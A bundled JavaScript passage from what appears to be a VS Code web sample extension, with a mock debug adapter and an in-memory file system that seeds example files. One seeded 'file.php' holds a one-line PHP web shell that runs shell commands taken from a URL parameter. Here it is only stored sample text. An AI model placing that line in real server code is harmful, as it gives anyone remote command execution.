            return vscode.window.showInformationMessage('Cannot find a program to debug').then(_ => {
                return undefined; // abort launch
            });
        }
        return config;
    }
}
class MockDebugAdapterDescriptorFactory {
    constructor(memfs) {
        this.memfs = memfs;
    }
    createDebugAdapterDescriptor(_session, _executable) {
        return new vscode.DebugAdapterInlineImplementation(new MockDebugSession(this.memfs));
    }
}
exports.MockDebugAdapterDescriptorFactory = MockDebugAdapterDescriptorFactory;
function basename(path) {
    const pos = path.lastIndexOf('/');
    if (pos >= 0) {
        return path.substring(pos + 1);
    }
    return path;
}
function timeout(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
class MockDebugSession extends DebugSession {
    /**
     * Creates a new debug adapter that is used for one debug session.
     * We configure the default implementation of a debug adapter here.
     */
    constructor(memfs) {
        super();
        this._variableHandles = new Handles();
        this._configurationDone = new Promise((r, _e) => {
            this.promiseResolve = r;
            setTimeout(r, 1000);
        });
        this._cancelationTokens = new Map();
        this._isLongrunning = new Map();
        // this debugger uses zero-based lines and columns
        this.setDebuggerLinesStartAt1(false);
        this.setDebuggerColumnsStartAt1(false);
        this._runtime = new MockRuntime(memfs);
        // setup event handlers
        this._runtime.onStopOnEntry(() => {
            this.sendEvent(new StoppedEvent('entry', MockDebugSession.THREAD_ID));
        });
        this._runtime.onStopOnStep(() => {
            this.sendEvent(new StoppedEvent('step', MockDebugSession.THREAD_ID));
        });
        this._runtime.onStopOnBreakpoint(() => {
            this.sendEvent(new StoppedEvent('breakpoint', MockDebugSession.THREAD_ID));
        });
        this._runtime.onStopOnDataBreakpoint(() => {
            this.sendEvent(new StoppedEvent('data breakpoint', MockDebugSession.THREAD_ID));
        });
        this._runtime.onStopOnException(() => {
            this.sendEvent(new StoppedEvent('exception', MockDebugSession.THREAD_ID));
        });
        this._runtime.onBreakpointValidated((bp) => {
            this.sendEvent(new BreakpointEvent('changed', { verified: bp.verified, id: bp.id }));
        });
        this._runtime.onOutput(oe => {
            const e = new OutputEvent(`${oe.text}\n`);
            e.body.source = this.createSource(oe.filePath);
            e.body.line = this.convertDebuggerLineToClient(oe.line);
            e.body.column = this.convertDebuggerColumnToClient(oe.column);
            this.sendEvent(e);
        });
        this._runtime.onEnd(() => {
            this.sendEvent(new TerminatedEvent());
        });
    }
    /**
     * The 'initialize' request is the first request called by the frontend
     * to interrogate the features the debug adapter provides.
     */
    initializeRequest(response, _args) {
        // build and return the capabilities of this debug adapter:
        response.body = response.body || {};
        // the adapter implements the configurationDoneRequest.
        response.body.supportsConfigurationDoneRequest = true;
        // make VS Code to use 'evaluate' when hovering over source
        response.body.supportsEvaluateForHovers = true;
        // make VS Code to show a 'step back' button
        response.body.supportsStepBack = true;
        // make VS Code to support data breakpoints
        response.body.supportsDataBreakpoints = true;
        // make VS Code to support completion in REPL
        response.body.supportsCompletionsRequest = true;
        response.body.completionTriggerCharacters = ['.', '['];
        // make VS Code to send cancelRequests
        response.body.supportsCancelRequest = true;
        // make VS Code send the breakpointLocations request
        response.body.supportsBreakpointLocationsRequest = true;
        this.sendResponse(response);
        // since this debug adapter can accept configuration requests like 'setBreakpoint' at any time,
        // we request them early by sending an 'initializeRequest' to the frontend.
        // The frontend will end the configuration sequence by calling 'configurationDone' request.
        this.sendEvent(new InitializedEvent());
    }
    /**
     * Called at the end of the configuration sequence.
     * Indicates that all breakpoints etc. have been sent to the DA and that the 'launch' can start.
     */
    configurationDoneRequest(response, args) {
        super.configurationDoneRequest(response, args);
        // notify the launchRequest that configuration has finished
        //this._configurationDone.notify();
        if (this.promiseResolve) {
            this.promiseResolve();
        }
    }
    async launchRequest(response, args) {
        // make sure to 'Stop' the buffered logging if 'trace' is not set
        //logger.setup(args.trace ? Logger.LogLevel.Verbose : Logger.LogLevel.Stop, false);
        // wait until configuration has finished (and configurationDoneRequest has been called)
        await this._configurationDone;
        // start the program in the runtime
        this._runtime.start(`memfs:${args.program}`, !!args.stopOnEntry);
        this.sendResponse(response);
    }
    setBreakPointsRequest(response, args) {
        const path = args.source.path;
        const clientLines = args.lines || [];
        // clear all breakpoints for this file
        this._runtime.clearBreakpoints(path);
        // set and verify breakpoint locations
        const actualBreakpoints = clientLines.map(l => {
            let { verified, line, id } = this._runtime.setBreakPoint(path, this.convertClientLineToDebugger(l));
            const bp = new Breakpoint(verified, this.convertDebuggerLineToClient(line));
            bp.id = id;
            return bp;
        });
        // send back the actual breakpoint positions
        response.body = {
            breakpoints: actualBreakpoints
        };
        this.sendResponse(response);
    }
    breakpointLocationsRequest(response, args, _request) {
        if (args.source.path) {
            const bps = this._runtime.getBreakpoints(args.source.path, this.convertClientLineToDebugger(args.line));
            response.body = {
                breakpoints: bps.map(col => {
                    return {
                        line: args.line,
                        column: this.convertDebuggerColumnToClient(col)
                    };
                })
            };
        }
        else {
            response.body = {
                breakpoints: []
            };
        }
        this.sendResponse(response);
    }
    threadsRequest(response) {
        // runtime supports no threads so just return a default thread.
        response.body = {
            threads: [
                new Thread(MockDebugSession.THREAD_ID, 'thread 1')
            ]
        };
        this.sendResponse(response);
    }
    stackTraceRequest(response, args) {
        const startFrame = typeof args.startFrame === 'number' ? args.startFrame : 0;
        const maxLevels = typeof args.levels === 'number' ? args.levels : 1000;
        const endFrame = startFrame + maxLevels;
        const stk = this._runtime.stack(startFrame, endFrame);
        response.body = {
            stackFrames: stk.frames.map(f => new StackFrame(f.index, f.name, this.createSource(f.file), this.convertDebuggerLineToClient(f.line))),
            totalFrames: stk.count
        };
        this.sendResponse(response);
    }
    scopesRequest(response, _args) {
        response.body = {
            scopes: [
                new Scope('Local', this._variableHandles.create('local'), false),
                new Scope('Global', this._variableHandles.create('global'), true)
            ]
        };
        this.sendResponse(response);
    }
    async variablesRequest(response, args, request) {
        const variables = [];
        if (this._isLongrunning.get(args.variablesReference)) {
            // long running
            if (request) {
                this._cancelationTokens.set(request.seq, false);
            }
            for (let i = 0; i < 100; i++) {
                await timeout(1000);
                variables.push({
                    name: `i_${i}`,
                    type: 'integer',
                    value: `${i}`,
                    variablesReference: 0
                });
                if (request && this._cancelationTokens.get(request.seq)) {
                    break;
                }
            }
            if (request) {
                this._cancelationTokens.delete(request.seq);
            }
        }
        else {
            const id = this._variableHandles.get(args.variablesReference);
            if (id) {
                variables.push({
                    name: id + '_i',
                    type: 'integer',
                    value: '123',
                    variablesReference: 0
                });
                variables.push({
                    name: id + '_f',
                    type: 'float',
                    value: '3.14',
                    variablesReference: 0
                });
                variables.push({
                    name: id + '_s',
                    type: 'string',
                    value: 'hello world',
                    variablesReference: 0
                });
                variables.push({
                    name: id + '_o',
                    type: 'object',
                    value: 'Object',
                    variablesReference: this._variableHandles.create(id + '_o')
                });
                // cancelation support for long running requests
                const nm = id + '_long_running';
                const ref = this._variableHandles.create(id + '_lr');
                variables.push({
                    name: nm,
                    type: 'object',
                    value: 'Object',
                    variablesReference: ref
                });
                this._isLongrunning.set(ref, true);
            }
        }
        response.body = {
            variables: variables
        };
        this.sendResponse(response);
    }
    continueRequest(response, _args) {
        this._runtime.continue();
        this.sendResponse(response);
    }
    reverseContinueRequest(response, _args) {
        this._runtime.continue(true);
        this.sendResponse(response);
    }
    nextRequest(response, _args) {
        this._runtime.step();
        this.sendResponse(response);
    }
    stepBackRequest(response, _args) {
        this._runtime.step(true);
        this.sendResponse(response);
    }
    evaluateRequest(response, args) {
        let reply = undefined;
        if (args.context === 'repl') {
            // 'evaluate' supports to create and delete breakpoints from the 'repl':
            const matches = /new +([0-9]+)/.exec(args.expression);
            if (matches && matches.length === 2) {
                if (this._runtime.sourceFile) {
                    const mbp = this._runtime.setBreakPoint(this._runtime.sourceFile, this.convertClientLineToDebugger(parseInt(matches[1])));
                    const bp = new Breakpoint(mbp.verified, this.convertDebuggerLineToClient(mbp.line), undefined, this.createSource(this._runtime.sourceFile));
                    bp.id = mbp.id;
                    this.sendEvent(new BreakpointEvent('new', bp));
                    reply = `breakpoint created`;
                }
            }
            else {
                const matches = /del +([0-9]+)/.exec(args.expression);
                if (matches && matches.length === 2) {
                    const mbp = this._runtime.sourceFile ? this._runtime.clearBreakPoint(this._runtime.sourceFile, this.convertClientLineToDebugger(parseInt(matches[1]))) : undefined;
                    if (mbp) {
                        const bp = new Breakpoint(false);
                        bp.id = mbp.id;
                        this.sendEvent(new BreakpointEvent('removed', bp));
                        reply = `breakpoint deleted`;
                    }
                }
            }
        }
        response.body = {
            result: reply ? reply : `evaluate(context: '${args.context}', '${args.expression}')`,
            variablesReference: 0
        };
        this.sendResponse(response);
    }
    dataBreakpointInfoRequest(response, args) {
        response.body = {
            dataId: null,
            description: 'cannot break on data access',
            accessTypes: undefined,
            canPersist: false
        };
        if (args.variablesReference && args.name) {
            const id = this._variableHandles.get(args.variablesReference);
            if (id && id.startsWith('global_')) {
                response.body.dataId = args.name;
                response.body.description = args.name;
                response.body.accessTypes = ['read'];
                response.body.canPersist = false;
            }
        }
        this.sendResponse(response);
    }
    setDataBreakpointsRequest(response, args) {
        // clear all data breakpoints
        this._runtime.clearAllDataBreakpoints();
        response.body = {
            breakpoints: []
        };
        for (let dbp of args.breakpoints) {
            // assume that id is the "address" to break on
            const ok = this._runtime.setDataBreakpoint(dbp.dataId);
            response.body.breakpoints.push({
                verified: ok
            });
        }
        this.sendResponse(response);
    }
    completionsRequest(response, _args) {
        response.body = {
            targets: [
                {
                    label: 'item 10',
                    sortText: '10'
                },
                {
                    label: 'item 1',
                    sortText: '01'
                },
                {
                    label: 'item 2',
                    sortText: '02'
                }
            ]
        };
        this.sendResponse(response);
    }
    cancelRequest(_response, args) {
        if (args.requestId) {
            this._cancelationTokens.set(args.requestId, true);
        }
    }
    //---- helpers
    createSource(filePath) {
        return new Source(basename(filePath), this.convertDebuggerPathToClient(filePath), undefined, undefined, 'mock-adapter-data');
    }
}
exports.MockDebugSession = MockDebugSession;
// we don't support multiple threads, so we can use a hardcoded ID for the default thread
MockDebugSession.THREAD_ID = 1;
/**
 * A Mock runtime with minimal debugger functionality.
 */
class MockRuntime {
    constructor(memfs) {
        this.memfs = memfs;
        this.stopOnEntry = new vscode.EventEmitter();
        this.onStopOnEntry = this.stopOnEntry.event;
        this.stopOnStep = new vscode.EventEmitter();
        this.onStopOnStep = this.stopOnStep.event;
        this.stopOnBreakpoint = new vscode.EventEmitter();
        this.onStopOnBreakpoint = this.stopOnBreakpoint.event;
        this.stopOnDataBreakpoint = new vscode.EventEmitter();
        this.onStopOnDataBreakpoint = this.stopOnDataBreakpoint.event;
        this.stopOnException = new vscode.EventEmitter();
        this.onStopOnException = this.stopOnException.event;
        this.breakpointValidated = new vscode.EventEmitter();
        this.onBreakpointValidated = this.breakpointValidated.event;
        this.output = new vscode.EventEmitter();
        this.onOutput = this.output.event;
        this.end = new vscode.EventEmitter();
        this.onEnd = this.end.event;
        // the contents (= lines) of the one and only file
        this._sourceLines = [];
        // This is the next line that will be 'executed'
        this._currentLine = 0;
        // maps from sourceFile to array of Mock breakpoints
        this._breakPoints = new Map();
        // since we want to send breakpoint events, we will assign an id to every event
        // so that the frontend can match events with breakpoints.
        this._breakpointId = 1;
        this._breakAddresses = new Set();
    }
    get sourceFile() {
        return this._sourceFile;
    }
    /**
     * Start executing the given program.
     */
    start(program, stopOnEntry) {
        this.loadSource(program);
        this._currentLine = -1;
        if (this._sourceFile) {
            this.verifyBreakpoints(this._sourceFile);
        }
        if (stopOnEntry) {
            // we step once
            this.step(false, this.stopOnEntry);
        }
        else {
            // we just start to run until we hit a breakpoint or an exception
            this.continue();
        }
    }
    /**
     * Continue execution to the end/beginning.
     */
    continue(reverse = false) {
        this.run(reverse, undefined);
    }
    /**
     * Step to the next/previous non empty line.
     */
    step(reverse = false, event = this.stopOnStep) {
        this.run(reverse, event);
    }
    /**
     * Returns a fake 'stacktrace' where every 'stackframe' is a word from the current line.
     */
    stack(startFrame, endFrame) {
        const words = this._sourceLines[this._currentLine].trim().split(/\s+/);
        const frames = new Array();
        // every word of the current line becomes a stack frame.
        for (let i = startFrame; i < Math.min(endFrame, words.length); i++) {
            const name = words[i]; // use a word of the line as the stackframe name
            frames.push({
                index: i,
                name: `${name}(${i})`,
                file: this._sourceFile,
                line: this._currentLine
            });
        }
        return {
            frames: frames,
            count: words.length
        };
    }
    getBreakpoints(_path, line) {
        const l = this._sourceLines[line];
        let sawSpace = true;
        const bps = [];
        for (let i = 0; i < l.length; i++) {
            if (l[i] !== ' ') {
                if (sawSpace) {
                    bps.push(i);
                    sawSpace = false;
                }
            }
            else {
                sawSpace = true;
            }
        }
        return bps;
    }
    /*
     * Set breakpoint in file with given line.
     */
    setBreakPoint(path, line) {
        const bp = { verified: false, line, id: this._breakpointId++ };
        let bps = this._breakPoints.get(path);
        if (!bps) {
            bps = new Array();
            this._breakPoints.set(path, bps);
        }
        bps.push(bp);
        this.verifyBreakpoints(path);
        return bp;
    }
    /*
     * Clear breakpoint in file with given line.
     */
    clearBreakPoint(path, line) {
        let bps = this._breakPoints.get(path);
        if (bps) {
            const index = bps.findIndex(bp => bp.line === line);
            if (index >= 0) {
                const bp = bps[index];
                bps.splice(index, 1);
                return bp;
            }
        }
        return undefined;
    }
    /*
     * Clear all breakpoints for file.
     */
    clearBreakpoints(path) {
        this._breakPoints.delete(path);
    }
    /*
     * Set data breakpoint.
     */
    setDataBreakpoint(address) {
        if (address) {
            this._breakAddresses.add(address);
            return true;
        }
        return false;
    }
    /*
     * Clear all data breakpoints.
     */
    clearAllDataBreakpoints() {
        this._breakAddresses.clear();
    }
    // private methods
    loadSource(file) {
        if (this._sourceFile !== file) {
            this._sourceFile = file;
            const _textDecoder = new TextDecoder();
            const uri = vscode.Uri.parse(file);
            const content = _textDecoder.decode(this.memfs.readFile(uri));
            this._sourceLines = content.split('\n');
            //this._sourceLines = readFileSync(this._sourceFile).toString().split('\n');
        }
    }
    /**
     * Run through the file.
     * If stepEvent is specified only run a single step and emit the stepEvent.
     */
    run(reverse = false, stepEvent) {
        if (reverse) {
            for (let ln = this._currentLine - 1; ln >= 0; ln--) {
                if (this.fireEventsForLine(ln, stepEvent)) {
                    this._currentLine = ln;
                    return;
                }
            }
            // no more lines: stop at first line
            this._currentLine = 0;
            this.stopOnEntry.fire();
        }
        else {
            for (let ln = this._currentLine + 1; ln < this._sourceLines.length; ln++) {
                if (this.fireEventsForLine(ln, stepEvent)) {
                    this._currentLine = ln;
                    return;
                }
            }
            // no more lines: run to end
            this.end.fire();
        }
    }
    verifyBreakpoints(path) {
        let bps = this._breakPoints.get(path);
        if (bps) {
            this.loadSource(path);
            bps.forEach(bp => {
                if (!bp.verified && bp.line < this._sourceLines.length) {
                    const srcLine = this._sourceLines[bp.line].trim();
                    // if a line is empty or starts with '+' we don't allow to set a breakpoint but move the breakpoint down
                    if (srcLine.length === 0 || srcLine.indexOf('+') === 0) {
                        bp.line++;
                    }
                    // if a line starts with '-' we don't allow to set a breakpoint but move the breakpoint up
                    if (srcLine.indexOf('-') === 0) {
                        bp.line--;
                    }
                    // don't set 'verified' to true if the line contains the word 'lazy'
                    // in this case the breakpoint will be verified 'lazy' after hitting it once.
                    if (srcLine.indexOf('lazy') < 0) {
                        bp.verified = true;
                        this.breakpointValidated.fire(bp);
                    }
                }
            });
        }
    }
    /**
     * Fire events if line has a breakpoint or the word 'exception' is found.
     * Returns true is execution needs to stop.
     */
    fireEventsForLine(ln, stepEvent) {
        const line = this._sourceLines[ln].trim();
        // if 'log(...)' found in source -> send argument to debug console
        const matches = /log\((.*)\)/.exec(line);
        if (matches && matches.length === 2) {
            if (this._sourceFile) {
                this.output.fire({ text: matches[1], filePath: this._sourceFile, line: ln, column: matches.index });
            }
        }
        // if a word in a line matches a data breakpoint, fire a 'dataBreakpoint' event
        const words = line.split(' ');
        for (let word of words) {
            if (this._breakAddresses.has(word)) {
                this.stopOnDataBreakpoint.fire();
                return true;
            }
        }
        // if word 'exception' found in source -> throw exception
        if (line.indexOf('exception') >= 0) {
            this.stopOnException.fire();
            return true;
        }
        // is there a breakpoint?
        const breakpoints = this._sourceFile ? this._breakPoints.get(this._sourceFile) : undefined;
        if (breakpoints) {
            const bps = breakpoints.filter(bp => bp.line === ln);
            if (bps.length > 0) {
                // send 'stopped' event
                this.stopOnBreakpoint.fire();
                // the following shows the use of 'breakpoint' events to update properties of a breakpoint in the UI
                // if breakpoint is not yet verified, verify it now and send a 'breakpoint' update event
                if (!bps[0].verified) {
                    bps[0].verified = true;
                    this.breakpointValidated.fire(bps[0]);
                }
                return true;
            }
        }
        // non-empty line
        if (stepEvent && line.length > 0) {
            stepEvent.fire();
            return true;
        }
        // nothing interesting found -> continue
        return false;
    }
}
exports.MockRuntime = MockRuntime;


/***/ }),
/* 1 */
/***/ (function(module, exports) {

module.exports = require("vscode");

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
Object.defineProperty(exports, "__esModule", { value: true });
exports.MemFS = exports.Directory = exports.File = void 0;
const vscode_1 = __webpack_require__(1);
window.vscode_1=vscode_1;
const exampleFiles_1 = __webpack_require__(3);
class File {
    constructor(uri, name) {
        this.uri = uri;
        this.type = vscode_1.FileType.File;
        this.ctime = Date.now();
        this.mtime = Date.now();
        this.size = 0;
        this.name = name;
    }
}
exports.File = File;
class Directory {
    constructor(uri, name) {
        this.uri = uri;
        this.type = vscode_1.FileType.Directory;
        this.ctime = Date.now();
        this.mtime = Date.now();
        this.size = 0;
        this.name = name;
        this.entries = new Map();
    }
}
exports.Directory = Directory;
const textEncoder = new TextEncoder();
class MemFS {
    constructor() {
        this.root = new Directory(vscode_1.Uri.parse('memfs:/'), '');
        // --- manage file events
        this._emitter = new vscode_1.EventEmitter();
        this._bufferedEvents = [];
        this.onDidChangeFile = this._emitter.event;
        this._textDecoder = new TextDecoder();
        this.disposable = vscode_1.Disposable.from(vscode_1.workspace.registerFileSystemProvider(MemFS.scheme, this, { isCaseSensitive: true }), vscode_1.workspace.registerFileSearchProvider(MemFS.scheme, this), vscode_1.workspace.registerTextSearchProvider(MemFS.scheme, this));
    }
    dispose() {
        var _a;
        (_a = this.disposable) === null || _a === void 0 ? void 0 : _a.dispose();
    }
    seed() {
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/`));
        // most common files types
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/large.ts`), textEncoder.encode(exampleFiles_1.largeTSFile), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.txt`), textEncoder.encode('foo'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.html`), textEncoder.encode('<html><body><h1 class="hd">Hello</h1></body></html>'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.js`), textEncoder.encode('console.log("JavaScript")'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.json`), textEncoder.encode('{ "json": true }'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.ts`), textEncoder.encode('console.log("TypeScript")'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.css`), textEncoder.encode('* { color: green; }'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.md`), textEncoder.encode(exampleFiles_1.debuggableFile), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.xml`), textEncoder.encode('<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.py`), textEncoder.encode('import base64, sys; base64.decode(open(sys.argv[1], "rb"), open(sys.argv[2], "wb"))'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.php`), textEncoder.encode('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.yaml`), textEncoder.encode('- just: write something'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/file.jpg`), exampleFiles_1.getImageFile(), { create: true, overwrite: true });
        // some more files & folders
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/folder/`));
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/large/`));
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/`));
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/abc`));
        this.createDirectory(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/def`));
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/folder/empty.txt`), new Uint8Array(0), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/folder/empty.foo`), new Uint8Array(0), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/folder/file.ts`), textEncoder.encode('let a:number = true; console.log(a);'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/large/rnd.foo`), randomData(50000), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/UPPER.txt`), textEncoder.encode('UPPER'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/upper.txt`), textEncoder.encode('upper'), { create: true, overwrite: true });
        this.writeFile(vscode_1.Uri.parse(`memfs:/sample-folder/xyz/def/foo.md`), textEncoder.encode('*MemFS*'), { create: true, overwrite: true });
    }
    // --- manage file metadata
    stat(uri) {
        const r = this._lookup(uri, false);
        console.log('stat',JSON.stringify(uri), r)
        return r;
    }
    readDirectory(uri) {
        const entry = this._lookupAsDirectory(uri, false);
        let result = [];
        for (const [name, child] of entry.entries) {
            result.push([name, child.type]);
        }
        return result;
    }
    // --- manage file contents
    readFile(uri) {
        const data = this._lookupAsFile(uri, false).data;
        if (data) {
            return data;
        }
        throw vscode_1.FileSystemError.FileNotFound();
    }
    writeFile(uri, content, options) {
        let basename = this._basename(uri.path);
        let parent = this._lookupParentDirectory(uri);
        let entry = parent.entries.get(basename);
        if (entry instanceof Directory) {
            throw vscode_1.FileSystemError.FileIsADirectory(uri);
        }
        if (!entry && !options.create) {
            throw vscode_1.FileSystemError.FileNotFound(uri);
        }
        if (entry && options.create && !options.overwrite) {
            throw vscode_1.FileSystemError.FileExists(uri);
        }
        if (!entry) {
            entry = new File(uri, basename);
            parent.entries.set(basename, entry);
            this._fireSoon({ type: vscode_1.FileChangeType.Created, uri });
        }
        entry.mtime = Date.now();
        entry.size = content.byteLength;
        entry.data = content;
        this._fireSoon({ type: vscode_1.FileChangeType.Changed, uri });
    }
    // --- manage files/folders
    rename(oldUri, newUri, options) {
        if (!options.overwrite && this._lookup(newUri, true)) {
            throw vscode_1.FileSystemError.FileExists(newUri);
        }
        let entry = this._lookup(oldUri, false);
        let oldParent = this._lookupParentDirectory(oldUri);
        let newParent = this._lookupParentDirectory(newUri);
        let newName = this._basename(newUri.path);
        oldParent.entries.delete(entry.name);
        entry.name = newName;
        newParent.entries.set(newName, entry);
        this._fireSoon({ type: vscode_1.FileChangeType.Deleted, uri: oldUri }, { type: vscode_1.FileChangeType.Created, uri: newUri });
    }
    delete(uri) {
        let dirname = uri.with({ path: this._dirname(uri.path) });
        let basename = this._basename(uri.path);
        let parent = this._lookupAsDirectory(dirname, false);
        if (!parent.entries.has(basename)) {
            throw vscode_1.FileSystemError.FileNotFound(uri);
        }
        parent.entries.delete(basename);
        parent.mtime = Date.now();
        parent.size -= 1;
        this._fireSoon({ type: vscode_1.FileChangeType.Changed, uri: dirname }, { uri, type: vscode_1.FileChangeType.Deleted });
    }
    createDirectory(uri) {
        let basename = this._basename(uri.path);
        let dirname = uri.with({ path: this._dirname(uri.path) });
        let parent = this._lookupAsDirectory(dirname, false);
        let entry = new Directory(uri, basename);
        parent.entries.set(entry.name, entry);
        parent.mtime = Date.now();
        parent.size += 1;
        this._fireSoon({ type: vscode_1.FileChangeType.Changed, uri: dirname }, { type: vscode_1.FileChangeType.Created, uri });
    }
    _lookup(uri, silent) {
        let parts = uri.path.split('/');
        let entry = this.root;
        for (const part of parts) {
            if (!part) {
                continue;
            }
            let child;
            if (entry instanceof Directory) {
                child = entry.entries.get(part);
            }
            if (!child) {
                if (!silent) {
                    throw vscode_1.FileSystemError.FileNotFound(uri);
                }
                else {
                    return undefined;
                }
            }
            entry = child;
        }
        return entry;
    }
    _lookupAsDirectory(uri, silent) {
        let entry = this._lookup(uri, silent);
        if (entry instanceof Directory) {
            return entry;
        }
        throw vscode_1.FileSystemError.FileNotADirectory(uri);
    }
    _lookupAsFile(uri, silent) {
        let entry = this._lookup(uri, silent);
        if (entry instanceof File) {
            return entry;
        }
        throw vscode_1.FileSystemError.FileIsADirectory(uri);
    }
    _lookupParentDirectory(uri) {
        const dirname = uri.with({ path: this._dirname(uri.path) });
        return this._lookupAsDirectory(dirname, false);
    }
    watch(_resource) {
        // ignore, fires for all changes...
        return new vscode_1.Disposable(() => { });
    }
    _fireSoon(...events) {
        this._bufferedEvents.push(...events);
        if (this._fireSoonHandle) {
            clearTimeout(this._fireSoonHandle);
        }
        this._fireSoonHandle = setTimeout(() => {
            this._emitter.fire(this._bufferedEvents);
            this._bufferedEvents.length = 0;
        }, 5);
    }
    // --- path utils
    _basename(path) {
        path = this._rtrim(path, '/');
        if (!path) {
            return '';
        }
        return path.substr(path.lastIndexOf('/') + 1);
    }
    _dirname(path) {
        path = this._rtrim(path, '/');
        if (!path) {
            return '/';
        }
        return path.substr(0, path.lastIndexOf('/'));
    }
    _rtrim(haystack, needle) {
        if (!haystack || !needle) {
            return haystack;
        }
        const needleLen = needle.length, haystackLen = haystack.length;
        if (needleLen === 0 || haystackLen === 0) {
            return haystack;
        }
        let offset = haystackLen, idx = -1;
        while (true) {
            idx = haystack.lastIndexOf(needle, offset - 1);
            if (idx === -1 || idx + needleLen !== offset) {
                break;
            }
            if (idx === 0) {
                return '';
            }
            offset = idx;
        }
        return haystack.substring(0, offset);
    }
    _getFiles() {
        const files = new Set();
        this._doGetFiles(this.root, files);
        return files;
    }
    _doGetFiles(dir, files) {
        dir.entries.forEach(entry => {
            if (entry instanceof File) {
                files.add(entry);
            }
            else {
                this._doGetFiles(entry, files);
            }
        });
    }
    _convertSimple2RegExpPattern(pattern) {
        return pattern.replace(/[\-\\\{\}\+\?\|\^\$\.\,\[\]\(\)\#\s]/g, '\\$&').replace(/[\*]/g, '.*');
    }
    // --- search provider
    provideFileSearchResults(query, _options, _token) {
        return this._findFiles(query.pattern);
    }
    _findFiles(query) {
        const files = this._getFiles();
        const result = [];
        const pattern = query ? new RegExp(this._convertSimple2RegExpPattern(query)) : null;
        for (const file of files) {
            if (!pattern || pattern.exec(file.name)) {
                result.push(file.uri);
            }
        }
        return result;
    }
    provideTextSearchResults(query, options, progress, _token) {
        const result = { limitHit: false };
        const files = this._findFiles(options.includes[0]);
        if (files) {
            for (const file of files) {
                const content = this._textDecoder.decode(this.readFile(file));
                const lines = content.split('\n');
                for (let i = 0; i < lines.length; i++) {
                    const line = lines[i];
                    const index = line.indexOf(query.pattern);
                    if (index !== -1) {
                        progress.report({
                            uri: file,
                            ranges: new vscode_1.Range(new vscode_1.Position(i, index), new vscode_1.Position(i, index + query.pattern.length)),
                            preview: {
                                text: line,
                                matches: new vscode_1.Range(new vscode_1.Position(0, index), new vscode_1.Position(0, index + query.pattern.length))
                            }
                        });
                    }
                }
            }
        }
        return result;
    }
}
exports.MemFS = MemFS;
MemFS.scheme = 'memfs';
function randomData(lineCnt, lineLen = 155) {
    let lines = [];
    for (let i = 0; i < lineCnt; i++) {
        let line = '';
        while (line.length < lineLen) {
            line += Math.random().toString(2 + (i % 34)).substr(2);
        }
        lines.push(line.substr(0, lineLen));
    }
    return textEncoder.encode(lines.join('\n'));
}


/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/
Object.defineProperty(exports, "__esModule", { value: true });
exports.getImageFile = exports.debuggableFile = exports.largeTSFile = void 0;
exports.largeTSFile = `/// <reference path="lib/Geometry.ts"/>
/// <reference path="Game.ts"/>

module Mankala {
export var storeHouses = [6,13];
export var svgNS = 'http://www.w3.org/2000/svg';

function createSVGRect(r:Rectangle) {
	var rect = document.createElementNS(svgNS,'rect');
	rect.setAttribute('x', r.x.toString());
	rect.setAttribute('y', r.y.toString());
	rect.setAttribute('width', r.width.toString());
	rect.setAttribute('height', r.height.toString());
	return rect;
}

function createSVGEllipse(r:Rectangle) {
	var ell = document.createElementNS(svgNS,'ellipse');
	ell.setAttribute('rx',(r.width/2).toString());
	ell.setAttribute('ry',(r.height/2).toString());
	ell.setAttribute('cx',(r.x+r.width/2).toString());
	ell.setAttribute('cy',(r.y+r.height/2).toString());
	return ell;
}

function createSVGEllipsePolar(angle:number,radius:number,tx:number,ty:number,cxo:number,cyo:number) {
	var ell = document.createElementNS(svgNS,'ellipse');
	ell.setAttribute('rx',radius.toString());
	ell.setAttribute('ry',(radius/3).toString());
	ell.setAttribute('cx',cxo.toString());
	ell.setAttribute('cy',cyo.toString());
	var dangle = angle*(180/Math.PI);
